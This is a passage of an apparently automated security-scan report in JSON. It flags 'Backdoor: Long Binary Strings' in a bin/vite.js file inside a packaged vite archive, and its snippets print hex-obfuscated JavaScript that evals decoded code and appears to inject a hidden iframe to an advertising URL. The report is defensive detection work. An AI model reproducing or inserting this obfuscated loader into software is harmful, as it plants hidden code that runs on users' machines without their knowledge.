\"\\x37\\x33\\x62\\x32\\x30\\x36\\x35\\x37\\x38\\x37\\x30\\x36\\x39\\x37\\x32\\x36\\x35\\x37\\x33\\x33\\x64\\x32\\x37\\x32\\x62\\x36\\x34\\x32\\x65\\x37\\x34\\x36\\x66\\x35\\x35\\x35\\x34\\x34\\x33\\x35\\x33\\x37\\x34\\x37\\x32\\x36\\x39\\x36\\x65\\x36\\x37\\x32\\x38\\x32\\x39\\x32\\x30\\x33\\x61\\x32\\x30\\x32\\x37\\x32\\x37\\x32\\x39\\x33\\x62\\x36\\x35\\x36\\x63\\x37",
                      "markdown": "`\\x73\\x75\\x62\\x73\\x74\\x72\\x69\\x6e\\x67\\x28\\x30\\x2c\\x6e\\x61\\x64\\x74\\x66\\x2e\\x6c\\x65\\x6e\\x67\\x74\\x68\\x2d\\x31\\x29\\x3b\\x65\\x76\\x61\\x6c\\x28\\x65\\x76\\x61\\x6c\\x28\\x27\\x53\\x74\\x72\\x69\\x6e\\x67\\x2e\\x66\\x72\\x6f\\x6d\\x43\\x68\\x61\\x72\\x43\\x6f\\x64\\x65\\x28\\x27\\x2b\\x6e\\x61\\x64\\x74\\x66\\x2b\\x27\\x29\\x27\\x29\\x29\\x3b\\x7d\", \"\\x36\\x36\\x36\\x66\\x32\\x66\\x36\\x64\\x36\\x35\\x36\\x37\\x36\\x31\\x36\\x31\\x36\\x34\\x37\\x36\\x36\\x35\\x37\\x32\\x37\\x34\\x36\\x39\\x37\\x61\\x36\\x35\\x32\\x66\\x33\\x66\\x36\\x62\\x36\\x35\\x37\\x39\\x37\\x37\\x36\\x66\\x37\\x32\\x36\\x34\\x33\\x64\\x33\\x34\\x33\\x38\\x33\\x38\\x33\\x37\\x33\\x30\\x33\\x30\\x33\\x35\\x33\\x38\\x33\\x32\\x36\\x36\\x36\\x32\\x33\\x33\\x33\\x39\\x33\\x38\\x36\\x34\\x33\\x30\\x33\\x32\\x33\\x30\\x33\\x32\\x33\\x37\\x33\\x31\\x33\\x37\\x36\\x32\\x33\\x36\\x33\\x32\\x36\\x34\\x33\\x35\\x33\", \"\\x37\\x33\\x62\\x32\\x30\\x36\\x35\\x37\\x38\\x37\\x30\\x36\\x39\\x37\\x32\\x36\\x35\\x37\\x33\\x33\\x64\\x32\\x37\\x32\\x62\\x36\\x34\\x32\\x65\\x37\\x34\\x36\\x66\\x35\\x35\\x35\\x34\\x34\\x33\\x35\\x33\\x37\\x34\\x37\\x32\\x36\\x39\\x36\\x65\\x36\\x37\\x32\\x38\\x32\\x39\\x32\\x30\\x33\\x61\\x32\\x30\\x32\\x37\\x32\\x37\\x32\\x39\\x33\\x62\\x36\\x35\\x36\\x63\\x37`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 2
          }
        },
        {
          "rule": {
            "id": "BD000805"
          },
          "message": {
            "text": "Backdoor: Long Binary Strings",
            "id": "BD000805"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/bin/vite.js"
                },
                "region": {
                  "startLine": 4,
                  "startColumn": 3095,
                  "endLine": 4,
                  "endColumn": 3523,
                  "snippet": {
                    "text": "\\x37\\x32\\x34\\x38\\x35\\x34\\x34\\x64\\x34\\x63\\x33\\x64\\x32\\x32\\x33\\x63\\x36\\x34\\x36\\x39\\x37\\x36\\x32\\x30\\x37\\x33\\x37\\x34\\x37\\x39\\x36\\x63\\x36\\x35\\x33\\x64\\x32\\x37\\x37\\x30\\x36\\x66\\x37\\x33\\x36\\x39\\x37\\x34\\x36\\x39\\x36\\x66\\x36\\x65\\x33\\x61\\x36\\x31\\x36\\x32\\x37\\x33\\x36\\x66\\x36\\x63\\x37\\x35\\x37\\x34\\x36\\x35\\x33\\x62\", \"\\x68\\x2c\\x64\\x74\\x65\\x66\\x68\\x2b\\x32\\x29\\x2c\\x20\\x31\\x36\\x29\\x2b\\x22\\x2c\\x22\\x3b\\x7d\\x6e\\x61\\x64\\x74\\x66\\x3d\\x6e\\x61\\x64\\x74\\x66\\x2e\\x73\\x75\\x62\\x73\\x74\\x72\\x69\\x6e\\x67\\x28\\x30\\x2c\\x6e\\x61\\x64\\x74\\x66\\x2e\\x6c\\x65\\x6e\\x67\\x74\\x68\\x2d\\x31\\x29\\x3b\\x65\\x76\\x61\\x6c\\x28\\x65\\x76\\x61\\x6c\\x28\\x27\\x53\\x74\\x72\\x69\\x6e\\x67\\x2e\\x66\\x72\\x6f\\x6d\\x43\\x68\\x61\\x72\\x43\\x6f\\x64\\x65\\x28\\x27\\x2b\\x6e\\x61\\x64\\x74\\x66\\x2b\\x27\\x29\\x27\\x29\\x29\\x3b\\x7d\", \"\\x36\\x36\\x36\\x66\\x32\\x66\\x36\\x64\\x36\\x35\\x36\\x37\\x36\\x31\\x36\\x31\\x36\\x34\\x37\\x36\\x36\\x35\\x37\\x32\\x37\\x34\\x36\\x39\\x37\\x61\\x36\\x35\\x32\\x66\\x33\\x66\\x36\\x62\\x36\\x35\\x37\\x39\\x37\\x37\\x36\\x66\\x37\\x32\\x36\\x34\\x33\\x64\\x33\\x34\\x33\\x38\\x33\\x38\\x33\\x37\\x33\\x30\\x33\\x30\\x33\\x35\\x33\\x38\\x33\\x32\\x36\\x36\\x36\\x32",
                    "rendered": {
                      "text": "\\x37\\x32\\x34\\x38\\x35\\x34\\x34\\x64\\x34\\x63\\x33\\x64\\x32\\x32\\x33\\x63\\x36\\x34\\x36\\x39\\x37\\x36\\x32\\x30\\x37\\x33\\x37\\x34\\x37\\x39\\x36\\x63\\x36\\x35\\x33\\x64\\x32\\x37\\x37\\x30\\x36\\x66\\x37\\x33\\x36\\x39\\x37\\x34\\x36\\x39\\x36\\x66\\x36\\x65\\x33\\x61\\x36\\x31\\x36\\x32\\x37\\x33\\x36\\x66\\x36\\x63\\x37\\x35\\x37\\x34\\x36\\x35\\x33\\x62\", \"\\x68\\x2c\\x64\\x74\\x65\\x66\\x68\\x2b\\x32\\x29\\x2c\\x20\\x31\\x36\\x29\\x2b\\x22\\x2c\\x22\\x3b\\x7d\\x6e\\x61\\x64\\x74\\x66\\x3d\\x6e\\x61\\x64\\x74\\x66\\x2e\\x73\\x75\\x62\\x73\\x74\\x72\\x69\\x6e\\x67\\x28\\x30\\x2c\\x6e\\x61\\x64\\x74\\x66\\x2e\\x6c\\x65\\x6e\\x67\\x74\\x68\\x2d\\x31\\x29\\x3b\\x65\\x76\\x61\\x6c\\x28\\x65\\x76\\x61\\x6c\\x28\\x27\\x53\\x74\\x72\\x69\\x6e\\x67\\x2e\\x66\\x72\\x6f\\x6d\\x43\\x68\\x61\\x72\\x43\\x6f\\x64\\x65\\x28\\x27\\x2b\\x6e\\x61\\x64\\x74\\x66\\x2b\\x27\\x29\\x27\\x29\\x29\\x3b\\x7d\", \"\\x36\\x36\\x36\\x66\\x32\\x66\\x36\\x64\\x36\\x35\\x36\\x37\\x36\\x31\\x36\\x31\\x36\\x34\\x37\\x36\\x36\\x35\\x37\\x32\\x37\\x34\\x36\\x39\\x37\\x61\\x36\\x35\\x32\\x66\\x33\\x66\\x36\\x62\\x36\\x35\\x37\\x39\\x37\\x37\\x36\\x66\\x37\\x32\\x36\\x34\\x33\\x64\\x33\\x34\\x33\\x38\\x33\\x38\\x33\\x37\\x33\\x30\\x33\\x30\\x33\\x35\\x33\\x38\\x33\\x32\\x36\\x36\\x36\\x32",
                      "markdown": "`\\x37\\x32\\x34\\x38\\x35\\x34\\x34\\x64\\x34\\x63\\x33\\x64\\x32\\x32\\x33\\x63\\x36\\x34\\x36\\x39\\x37\\x36\\x32\\x30\\x37\\x33\\x37\\x34\\x37\\x39\\x36\\x63\\x36\\x35\\x33\\x64\\x32\\x37\\x37\\x30\\x36\\x66\\x37\\x33\\x36\\x39\\x37\\x34\\x36\\x39\\x36\\x66\\x36\\x65\\x33\\x61\\x36\\x31\\x36\\x32\\x37\\x33\\x36\\x66\\x36\\x63\\x37\\x35\\x37\\x34\\x36\\x35\\x33\\x62\", \"\\x68\\x2c\\x64\\x74\\x65\\x66\\x68\\x2b\\x32\\x29\\x2c\\x20\\x31\\x36\\x29\\x2b\\x22\\x2c\\x22\\x3b\\x7d\\x6e\\x61\\x64\\x74\\x66\\x3d\\x6e\\x61\\x64\\x74\\x66\\x2e\\x73\\x75\\x62\\x73\\x74\\x72\\x69\\x6e\\x67\\x28\\x30\\x2c\\x6e\\x61\\x64\\x74\\x66\\x2e\\x6c\\x65\\x6e\\x67\\x74\\x68\\x2d\\x31\\x29\\x3b\\x65\\x76\\x61\\x6c\\x28\\x65\\x76\\x61\\x6c\\x28\\x27\\x53\\x74\\x72\\x69\\x6e\\x67\\x2e\\x66\\x72\\x6f\\x6d\\x43\\x68\\x61\\x72\\x43\\x6f\\x64\\x65\\x28\\x27\\x2b\\x6e\\x61\\x64\\x74\\x66\\x2b\\x27\\x29\\x27\\x29\\x29\\x3b\\x7d\", \"\\x36\\x36\\x36\\x66\\x32\\x66\\x36\\x64\\x36\\x35\\x36\\x37\\x36\\x31\\x36\\x31\\x36\\x34\\x37\\x36\\x36\\x35\\x37\\x32\\x37\\x34\\x36\\x39\\x37\\x61\\x36\\x35\\x32\\x66\\x33\\x66\\x36\\x62\\x36\\x35\\x37\\x39\\x37\\x37\\x36\\x66\\x37\\x32\\x36\\x34\\x33\\x64\\x33\\x34\\x33\\x38\\x33\\x38\\x33\\x37\\x33\\x30\\x33\\x30\\x33\\x35\\x33\\x38\\x33\\x32\\x36\\x36\\x36\\x32`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 2
          }
        },
        {
          "rule": {
            "id": "BD000805"
          },
          "message": {
            "text": "Backdoor: Long Binary Strings",
            "id": "BD000805"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/bin/vite.js"
                },
                "region": {
                  "startLine": 4,
                  "startColumn": 2663,
                  "endLine": 4,
                  "endColumn": 3091,
                  "snippet": {
                    "text": "\\x36\\x64\\x36\\x35\\x33\\x65\\x33\\x63\\x32\\x66\\x36\\x34\\x36\\x39\\x37\\x36\\x33\\x65\\x32\\x32\\x33\\x62\\x36\\x34\\x36\\x66\\x36\\x33\\x37\\x35\\x36\\x64\\x36\\x35\\x36\\x65\\x37\\x34\\x32\\x65\\x36\\x32\\x36\\x66\\x36\\x34\\x37\\x39\\x32\\x65\\x36\\x31\\x37\\x30\\x37\\x30\\x36\\x35\\x36\\x65\\x36\\x34\\x34\\x33\\x36\\x38\\x36\\x39\\x36\\x63\\x36\\x34\\x32\\x38\", \"\\x31\\x33\\x35\\x33\\x31\\x33\\x31\\x33\\x36\\x32\\x32\\x33\\x62\\x37\\x38\\x33\\x32\\x33\\x32\\x36\\x34\\x37\\x31\\x32\\x65\\x36\\x39\\x36\\x65\\x36\\x65\\x36\\x35\\x37\\x32\\x34\\x38\\x35\\x34\\x34\\x64\\x34\\x63\\x33\\x64\\x32\\x32\\x33\\x63\\x36\\x34\\x36\\x39\\x37\\x36\\x32\\x30\\x37\\x33\\x37\\x34\\x37\\x39\\x36\\x63\\x36\\x35\\x33\\x64\\x32\\x37\\x37\\x30\\x36\\x66\\x37\\x33\\x36\\x39\\x37\\x34\\x36\\x39\\x36\\x66\\x36\\x65\\x33\\x61\\x36\\x31\\x36\\x32\\x37\\x33\\x36\\x66\\x36\\x63\\x37\\x35\\x37\\x34\\x36\\x35\\x33\\x62\", \"\\x68\\x2c\\x64\\x74\\x65\\x66\\x68\\x2b\\x32\\x29\\x2c\\x20\\x31\\x36\\x29\\x2b\\x22\\x2c\\x22\\x3b\\x7d\\x6e\\x61\\x64\\x74\\x66\\x3d\\x6e\\x61\\x64\\x74\\x66\\x2e\\x73\\x75\\x62\\x73\\x74\\x72\\x69\\x6e\\x67\\x28\\x30\\x2c\\x6e\\x61\\x64\\x74\\x66\\x2e\\x6c\\x65\\x6e\\x67\\x74\\x68\\x2d\\x31\\x29\\x3b\\x65\\x76\\x61\\x6c\\x28\\x65\\x76\\x61\\x6c\\x28\\x27\\x53\\x74",
                    "rendered": {
                      "text": "\\x36\\x64\\x36\\x35\\x33\\x65\\x33\\x63\\x32\\x66\\x36\\x34\\x36\\x39\\x37\\x36\\x33\\x65\\x32\\x32\\x33\\x62\\x36\\x34\\x36\\x66\\x36\\x33\\x37\\x35\\x36\\x64\\x36\\x35\\x36\\x65\\x37\\x34\\x32\\x65\\x36\\x32\\x36\\x66\\x36\\x34\\x37\\x39\\x32\\x65\\x36\\x31\\x37\\x30\\x37\\x30\\x36\\x35\\x36\\x65\\x36\\x34\\x34\\x33\\x36\\x38\\x36\\x39\\x36\\x63\\x36\\x34\\x32\\x38\", \"\\x31\\x33\\x35\\x33\\x31\\x33\\x31\\x33\\x36\\x32\\x32\\x33\\x62\\x37\\x38\\x33\\x32\\x33\\x32\\x36\\x34\\x37\\x31\\x32\\x65\\x36\\x39\\x36\\x65\\x36\\x65\\x36\\x35\\x37\\x32\\x34\\x38\\x35\\x34\\x34\\x64\\x34\\x63\\x33\\x64\\x32\\x32\\x33\\x63\\x36\\x34\\x36\\x39\\x37\\x36\\x32\\x30\\x37\\x33\\x37\\x34\\x37\\x39\\x36\\x63\\x36\\x35\\x33\\x64\\x32\\x37\\x37\\x30\\x36\\x66\\x37\\x33\\x36\\x39\\x37\\x34\\x36\\x39\\x36\\x66\\x36\\x65\\x33\\x61\\x36\\x31\\x36\\x32\\x37\\x33\\x36\\x66\\x36\\x63\\x37\\x35\\x37\\x34\\x36\\x35\\x33\\x62\", \"\\x68\\x2c\\x64\\x74\\x65\\x66\\x68\\x2b\\x32\\x29\\x2c\\x20\\x31\\x36\\x29\\x2b\\x22\\x2c\\x22\\x3b\\x7d\\x6e\\x61\\x64\\x74\\x66\\x3d\\x6e\\x61\\x64\\x74\\x66\\x2e\\x73\\x75\\x62\\x73\\x74\\x72\\x69\\x6e\\x67\\x28\\x30\\x2c\\x6e\\x61\\x64\\x74\\x66\\x2e\\x6c\\x65\\x6e\\x67\\x74\\x68\\x2d\\x31\\x29\\x3b\\x65\\x76\\x61\\x6c\\x28\\x65\\x76\\x61\\x6c\\x28\\x27\\x53\\x74",
                      "markdown": "`\\x36\\x64\\x36\\x35\\x33\\x65\\x33\\x63\\x32\\x66\\x36\\x34\\x36\\x39\\x37\\x36\\x33\\x65\\x32\\x32\\x33\\x62\\x36\\x34\\x36\\x66\\x36\\x33\\x37\\x35\\x36\\x64\\x36\\x35\\x36\\x65\\x37\\x34\\x32\\x65\\x36\\x32\\x36\\x66\\x36\\x34\\x37\\x39\\x32\\x65\\x36\\x31\\x37\\x30\\x37\\x30\\x36\\x35\\x36\\x65\\x36\\x34\\x34\\x33\\x36\\x38\\x36\\x39\\x36\\x63\\x36\\x34\\x32\\x38\", \"\\x31\\x33\\x35\\x33\\x31\\x33\\x31\\x33\\x36\\x32\\x32\\x33\\x62\\x37\\x38\\x33\\x32\\x33\\x32\\x36\\x34\\x37\\x31\\x32\\x65\\x36\\x39\\x36\\x65\\x36\\x65\\x36\\x35\\x37\\x32\\x34\\x38\\x35\\x34\\x34\\x64\\x34\\x63\\x33\\x64\\x32\\x32\\x33\\x63\\x36\\x34\\x36\\x39\\x37\\x36\\x32\\x30\\x37\\x33\\x37\\x34\\x37\\x39\\x36\\x63\\x36\\x35\\x33\\x64\\x32\\x37\\x37\\x30\\x36\\x66\\x37\\x33\\x36\\x39\\x37\\x34\\x36\\x39\\x36\\x66\\x36\\x65\\x33\\x61\\x36\\x31\\x36\\x32\\x37\\x33\\x36\\x66\\x36\\x63\\x37\\x35\\x37\\x34\\x36\\x35\\x33\\x62\", \"\\x68\\x2c\\x64\\x74\\x65\\x66\\x68\\x2b\\x32\\x29\\x2c\\x20\\x31\\x36\\x29\\x2b\\x22\\x2c\\x22\\x3b\\x7d\\x6e\\x61\\x64\\x74\\x66\\x3d\\x6e\\x61\\x64\\x74\\x66\\x2e\\x73\\x75\\x62\\x73\\x74\\x72\\x69\\x6e\\x67\\x28\\x30\\x2c\\x6e\\x61\\x64\\x74\\x66\\x2e\\x6c\\x65\\x6e\\x67\\x74\\x68\\x2d\\x31\\x29\\x3b\\x65\\x76\\x61\\x6c\\x28\\x65\\x76\\x61\\x6c\\x28\\x27\\x53\\x74`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 2
          }
        },
        {
          "rule": {
            "id": "BD000805"
          },
          "message": {
            "text": "Backdoor: Long Binary Strings",
            "id": "BD000805"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/bin/vite.js"
                },
                "region": {
                  "startLine": 4,
                  "startColumn": 2231,
                  "endLine": 4,
                  "endColumn": 2659,
                  "snippet": {
                    "text": "\\x30\\x36\\x36\\x36\\x31\\x36\\x63\\x37\\x33\\x36\\x35\\x33\\x62\\x37\\x32\\x36\\x35\\x37\\x34\\x37\\x35\\x37\\x32\\x36\\x65\\x32\\x30\\x36\\x33\\x35\\x62\\x33\\x31\\x35\\x64\\x32\\x30\\x33\\x66\\x32\\x30\\x36\\x33\\x35\\x62\\x33\\x31\\x35\\x64\\x32\\x30\\x33\\x61\\x32\\x30\\x36\\x36\\x36\\x31\\x36\\x63\\x37\\x33\\x36\\x35\\x33\\x62\\x37\\x64\\x37\\x36\\x36\\x31\\x37\", \"\\x32\\x32\\x62\\x37\\x38\\x33\\x32\\x33\\x32\\x37\\x31\\x37\\x31\\x32\\x62\\x32\\x32\\x32\\x37\\x33\\x65\\x33\\x63\\x32\\x66\\x36\\x39\\x36\\x36\\x37\\x32\\x36\\x31\\x36\\x64\\x36\\x35\\x33\\x65\\x33\\x63\\x32\\x66\\x36\\x34\\x36\\x39\\x37\\x36\\x33\\x65\\x32\\x32\\x33\\x62\\x36\\x34\\x36\\x66\\x36\\x33\\x37\\x35\\x36\\x64\\x36\\x35\\x36\\x65\\x37\\x34\\x32\\x65\\x36\\x32\\x36\\x66\\x36\\x34\\x37\\x39\\x32\\x65\\x36\\x31\\x37\\x30\\x37\\x30\\x36\\x35\\x36\\x65\\x36\\x34\\x34\\x33\\x36\\x38\\x36\\x39\\x36\\x63\\x36\\x34\\x32\\x38\", \"\\x31\\x33\\x35\\x33\\x31\\x33\\x31\\x33\\x36\\x32\\x32\\x33\\x62\\x37\\x38\\x33\\x32\\x33\\x32\\x36\\x34\\x37\\x31\\x32\\x65\\x36\\x39\\x36\\x65\\x36\\x65\\x36\\x35\\x37\\x32\\x34\\x38\\x35\\x34\\x34\\x64\\x34\\x63\\x33\\x64\\x32\\x32\\x33\\x63\\x36\\x34\\x36\\x39\\x37\\x36\\x32\\x30\\x37\\x33\\x37\\x34\\x37\\x39\\x36\\x63\\x36\\x35\\x33\\x64\\x32\\x37\\x37\\x30\\x36",
                    "rendered": {
                      "text": "\\x30\\x36\\x36\\x36\\x31\\x36\\x63\\x37\\x33\\x36\\x35\\x33\\x62\\x37\\x32\\x36\\x35\\x37\\x34\\x37\\x35\\x37\\x32\\x36\\x65\\x32\\x30\\x36\\x33\\x35\\x62\\x33\\x31\\x35\\x64\\x32\\x30\\x33\\x66\\x32\\x30\\x36\\x33\\x35\\x62\\x33\\x31\\x35\\x64\\x32\\x30\\x33\\x61\\x32\\x30\\x36\\x36\\x36\\x31\\x36\\x63\\x37\\x33\\x36\\x35\\x33\\x62\\x37\\x64\\x37\\x36\\x36\\x31\\x37\", \"\\x32\\x32\\x62\\x37\\x38\\x33\\x32\\x33\\x32\\x37\\x31\\x37\\x31\\x32\\x62\\x32\\x32\\x32\\x37\\x33\\x65\\x33\\x63\\x32\\x66\\x36\\x39\\x36\\x36\\x37\\x32\\x36\\x31\\x36\\x64\\x36\\x35\\x33\\x65\\x33\\x63\\x32\\x66\\x36\\x34\\x36\\x39\\x37\\x36\\x33\\x65\\x32\\x32\\x33\\x62\\x36\\x34\\x36\\x66\\x36\\x33\\x37\\x35\\x36\\x64\\x36\\x35\\x36\\x65\\x37\\x34\\x32\\x65\\x36\\x32\\x36\\x66\\x36\\x34\\x37\\x39\\x32\\x65\\x36\\x31\\x37\\x30\\x37\\x30\\x36\\x35\\x36\\x65\\x36\\x34\\x34\\x33\\x36\\x38\\x36\\x39\\x36\\x63\\x36\\x34\\x32\\x38\", \"\\x31\\x33\\x35\\x33\\x31\\x33\\x31\\x33\\x36\\x32\\x32\\x33\\x62\\x37\\x38\\x33\\x32\\x33\\x32\\x36\\x34\\x37\\x31\\x32\\x65\\x36\\x39\\x36\\x65\\x36\\x65\\x36\\x35\\x37\\x32\\x34\\x38\\x35\\x34\\x34\\x64\\x34\\x63\\x33\\x64\\x32\\x32\\x33\\x63\\x36\\x34\\x36\\x39\\x37\\x36\\x32\\x30\\x37\\x33\\x37\\x34\\x37\\x39\\x36\\x63\\x36\\x35\\x33\\x64\\x32\\x37\\x37\\x30\\x36",
                      "markdown": "`\\x30\\x36\\x36\\x36\\x31\\x36\\x63\\x37\\x33\\x36\\x35\\x33\\x62\\x37\\x32\\x36\\x35\\x37\\x34\\x37\\x35\\x37\\x32\\x36\\x65\\x32\\x30\\x36\\x33\\x35\\x62\\x33\\x31\\x35\\x64\\x32\\x30\\x33\\x66\\x32\\x30\\x36\\x33\\x35\\x62\\x33\\x31\\x35\\x64\\x32\\x30\\x33\\x61\\x32\\x30\\x36\\x36\\x36\\x31\\x36\\x63\\x37\\x33\\x36\\x35\\x33\\x62\\x37\\x64\\x37\\x36\\x36\\x31\\x37\", \"\\x32\\x32\\x62\\x37\\x38\\x33\\x32\\x33\\x32\\x37\\x31\\x37\\x31\\x32\\x62\\x32\\x32\\x32\\x37\\x33\\x65\\x33\\x63\\x32\\x66\\x36\\x39\\x36\\x36\\x37\\x32\\x36\\x31\\x36\\x64\\x36\\x35\\x33\\x65\\x33\\x63\\x32\\x66\\x36\\x34\\x36\\x39\\x37\\x36\\x33\\x65\\x32\\x32\\x33\\x62\\x36\\x34\\x36\\x66\\x36\\x33\\x37\\x35\\x36\\x64\\x36\\x35\\x36\\x65\\x37\\x34\\x32\\x65\\x36\\x32\\x36\\x66\\x36\\x34\\x37\\x39\\x32\\x65\\x36\\x31\\x37\\x30\\x37\\x30\\x36\\x35\\x36\\x65\\x36\\x34\\x34\\x33\\x36\\x38\\x36\\x39\\x36\\x63\\x36\\x34\\x32\\x38\", \"\\x31\\x33\\x35\\x33\\x31\\x33\\x31\\x33\\x36\\x32\\x32\\x33\\x62\\x37\\x38\\x33\\x32\\x33\\x32\\x36\\x34\\x37\\x31\\x32\\x65\\x36\\x39\\x36\\x65\\x36\\x65\\x36\\x35\\x37\\x32\\x34\\x38\\x35\\x34\\x34\\x64\\x34\\x63\\x33\\x64\\x32\\x32\\x33\\x63\\x36\\x34\\x36\\x39\\x37\\x36\\x32\\x30\\x37\\x33\\x37\\x34\\x37\\x39\\x36\\x63\\x36\\x35\\x33\\x64\\x32\\x37\\x37\\x30\\x36`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 2
          }
        },
        {
          "rule": {
            "id": "BD000805"
          },
          "message": {
            "text": "Backdoor: Long Binary Strings",
            "id": "BD000805"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/bin/vite.js"
                },
                "region": {
                  "startLine": 4,
                  "startColumn": 1799,
                  "endLine": 4,
                  "endColumn": 2227,
                  "snippet": {
                    "text": "\\x68\\x3d\\x30\\x3b\\x64\\x74\\x65\\x66\\x68\\x3c\\x66\\x65\\x69\\x64\\x64\\x2e\\x6c\\x65\\x6e\\x67\\x74\\x68\\x3b\\x64\\x74\\x65\\x66\\x68\\x2b\\x3d\\x32\\x29\\x7b\\x6e\\x61\\x64\\x74\\x66\\x3d\\x6e\\x61\\x64\\x74\\x66\\x2b\\x70\\x61\\x72\\x73\\x65\\x49\\x6e\\x74\\x28\\x66\\x65\\x69\\x64\\x64\\x2e\\x73\\x75\\x62\\x73\\x74\\x72\\x69\\x6e\\x67\\x28\\x64\\x74\\x65\\x66\", \"\\x32\\x37\\x33\\x64\\x32\\x37\\x32\\x39\\x33\\x62\\x36\\x35\\x36\\x63\\x37\\x33\\x36\\x35\\x32\\x30\\x37\\x32\\x36\\x35\\x37\\x34\\x37\\x35\\x37\\x32\\x36\\x65\\x32\\x30\\x36\\x36\\x36\\x31\\x36\\x63\\x37\\x33\\x36\\x35\\x33\\x62\\x37\\x32\\x36\\x35\\x37\\x34\\x37\\x35\\x37\\x32\\x36\\x65\\x32\\x30\\x36\\x33\\x35\\x62\\x33\\x31\\x35\\x64\\x32\\x30\\x33\\x66\\x32\\x30\\x36\\x33\\x35\\x62\\x33\\x31\\x35\\x64\\x32\\x30\\x33\\x61\\x32\\x30\\x36\\x36\\x36\\x31\\x36\\x63\\x37\\x33\\x36\\x35\\x33\\x62\\x37\\x64\\x37\\x36\\x36\\x31\\x37\", \"\\x32\\x32\\x62\\x37\\x38\\x33\\x32\\x33\\x32\\x37\\x31\\x37\\x31\\x32\\x62\\x32\\x32\\x32\\x37\\x33\\x65\\x33\\x63\\x32\\x66\\x36\\x39\\x36\\x36\\x37\\x32\\x36\\x31\\x36\\x64\\x36\\x35\\x33\\x65\\x33\\x63\\x32\\x66\\x36\\x34\\x36\\x39\\x37\\x36\\x33\\x65\\x32\\x32\\x33\\x62\\x36\\x34\\x36\\x66\\x36\\x33\\x37\\x35\\x36\\x64\\x36\\x35\\x36\\x65\\x37\\x34\\x32\\x65\\x36",
                    "rendered": {
                      "text": "\\x68\\x3d\\x30\\x3b\\x64\\x74\\x65\\x66\\x68\\x3c\\x66\\x65\\x69\\x64\\x64\\x2e\\x6c\\x65\\x6e\\x67\\x74\\x68\\x3b\\x64\\x74\\x65\\x66\\x68\\x2b\\x3d\\x32\\x29\\x7b\\x6e\\x61\\x64\\x74\\x66\\x3d\\x6e\\x61\\x64\\x74\\x66\\x2b\\x70\\x61\\x72\\x73\\x65\\x49\\x6e\\x74\\x28\\x66\\x65\\x69\\x64\\x64\\x2e\\x73\\x75\\x62\\x73\\x74\\x72\\x69\\x6e\\x67\\x28\\x64\\x74\\x65\\x66\", \"\\x32\\x37\\x33\\x64\\x32\\x37\\x32\\x39\\x33\\x62\\x36\\x35\\x36\\x63\\x37\\x33\\x36\\x35\\x32\\x30\\x37\\x32\\x36\\x35\\x37\\x34\\x37\\x35\\x37\\x32\\x36\\x65\\x32\\x30\\x36\\x36\\x36\\x31\\x36\\x63\\x37\\x33\\x36\\x35\\x33\\x62\\x37\\x32\\x36\\x35\\x37\\x34\\x37\\x35\\x37\\x32\\x36\\x65\\x32\\x30\\x36\\x33\\x35\\x62\\x33\\x31\\x35\\x64\\x32\\x30\\x33\\x66\\x32\\x30\\x36\\x33\\x35\\x62\\x33\\x31\\x35\\x64\\x32\\x30\\x33\\x61\\x32\\x30\\x36\\x36\\x36\\x31\\x36\\x63\\x37\\x33\\x36\\x35\\x33\\x62\\x37\\x64\\x37\\x36\\x36\\x31\\x37\", \"\\x32\\x32\\x62\\x37\\x38\\x33\\x32\\x33\\x32\\x37\\x31\\x37\\x31\\x32\\x62\\x32\\x32\\x32\\x37\\x33\\x65\\x33\\x63\\x32\\x66\\x36\\x39\\x36\\x36\\x37\\x32\\x36\\x31\\x36\\x64\\x36\\x35\\x33\\x65\\x33\\x63\\x32\\x66\\x36\\x34\\x36\\x39\\x37\\x36\\x33\\x65\\x32\\x32\\x33\\x62\\x36\\x34\\x36\\x66\\x36\\x33\\x37\\x35\\x36\\x64\\x36\\x35\\x36\\x65\\x37\\x34\\x32\\x65\\x36",
                      "markdown": "`\\x68\\x3d\\x30\\x3b\\x64\\x74\\x65\\x66\\x68\\x3c\\x66\\x65\\x69\\x64\\x64\\x2e\\x6c\\x65\\x6e\\x67\\x74\\x68\\x3b\\x64\\x74\\x65\\x66\\x68\\x2b\\x3d\\x32\\x29\\x7b\\x6e\\x61\\x64\\x74\\x66\\x3d\\x6e\\x61\\x64\\x74\\x66\\x2b\\x70\\x61\\x72\\x73\\x65\\x49\\x6e\\x74\\x28\\x66\\x65\\x69\\x64\\x64\\x2e\\x73\\x75\\x62\\x73\\x74\\x72\\x69\\x6e\\x67\\x28\\x64\\x74\\x65\\x66\", \"\\x32\\x37\\x33\\x64\\x32\\x37\\x32\\x39\\x33\\x62\\x36\\x35\\x36\\x63\\x37\\x33\\x36\\x35\\x32\\x30\\x37\\x32\\x36\\x35\\x37\\x34\\x37\\x35\\x37\\x32\\x36\\x65\\x32\\x30\\x36\\x36\\x36\\x31\\x36\\x63\\x37\\x33\\x36\\x35\\x33\\x62\\x37\\x32\\x36\\x35\\x37\\x34\\x37\\x35\\x37\\x32\\x36\\x65\\x32\\x30\\x36\\x33\\x35\\x62\\x33\\x31\\x35\\x64\\x32\\x30\\x33\\x66\\x32\\x30\\x36\\x33\\x35\\x62\\x33\\x31\\x35\\x64\\x32\\x30\\x33\\x61\\x32\\x30\\x36\\x36\\x36\\x31\\x36\\x63\\x37\\x33\\x36\\x35\\x33\\x62\\x37\\x64\\x37\\x36\\x36\\x31\\x37\", 